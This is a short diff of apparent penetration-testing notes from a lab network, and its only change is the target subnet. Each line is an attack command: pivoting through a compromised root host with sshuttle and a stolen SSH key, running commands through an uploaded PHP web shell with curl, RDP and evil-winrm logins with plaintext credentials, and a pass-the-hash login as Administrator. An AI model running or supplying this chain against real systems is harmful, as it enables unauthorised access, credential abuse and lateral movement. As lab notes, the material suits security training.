@@ -1,9 +1,9 @@
-sshuttle -r root@10.200.57.200 --ssh-cmd "ssh -i root_id_rsa" -x 10.200.57.200 -N
+sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i root_id_rsa" -x 10.200.85.200 -N
 
-curl -X POST 10.200.57.150/web/exploit-chelebi.php -d "a=whoami"
+curl -X POST 10.200.85.150/web/exploit-chelebi.php -d "a=whoami"
 
 rdp user:pass
 chelebi:12341234
-xfreerdp /v:10.200.57.150 /u:chelebi /p:'12341234' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
-evil-winrm -u chelebi -p 12341234 -i 10.200.57.150
-evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150
+xfreerdp /v:10.200.85.150 /u:chelebi /p:'12341234' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+evil-winrm -u chelebi -p 12341234 -i 10.200.85.150
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.85.150
